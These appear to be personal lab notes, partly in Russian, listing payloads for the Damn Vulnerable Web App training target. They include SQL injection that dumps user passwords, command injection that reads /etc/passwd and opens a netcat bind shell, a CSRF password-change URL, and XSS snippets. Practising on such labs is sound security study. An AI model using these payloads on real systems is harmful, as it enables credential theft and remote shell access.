# Damn Vulnerable Web App

[DWVA](https://computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=688b0913be93a4d95daed400990c4745&TYPE=SUB)

## SQL injection

```
%' and 1=0 union select null, concat(user,':',password) from users #
%' or '0'='0
%' and 1=0 union select null, table_name from information_schema.tables #
```

## Command injection:

```
192.168.1.106; cat /etc/passwd
192.168.1.106;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
```

С локальной машины:

```
nc localhost 4444
date
whoami
```

## CSRF

```
http://localhost:8080/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change
```

## XSS

* отраженные (временные). Сайт берет данные из вредоносной строки и подставляет в виде модифицированного URL-ответа
  жертве.
    ```
    <script>alert(document.cookie)</script>
    ```
* хранимые
    ```
    <script>alert("Hello, world")</script>
    <iframe src="http://www.cnn.com"></iframe>
    ```